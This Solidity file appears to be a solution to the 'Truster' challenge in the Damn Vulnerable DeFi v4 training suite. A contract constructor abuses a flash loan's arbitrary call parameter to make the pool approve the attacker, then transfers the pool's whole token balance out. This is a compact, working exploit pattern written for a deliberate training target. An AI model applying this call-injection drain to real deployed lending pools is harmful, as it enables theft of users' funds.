// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract Target {
    using Address for address;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        uint256 b = _token.balanceOf(address(_pool)); 
        _pool.flashLoan(0, address(this), address(_token), abi.encodeWithSignature("approve(address,uint256)", address(this), b));
        _token.transferFrom(address(_pool), _recovery, b);
    }
}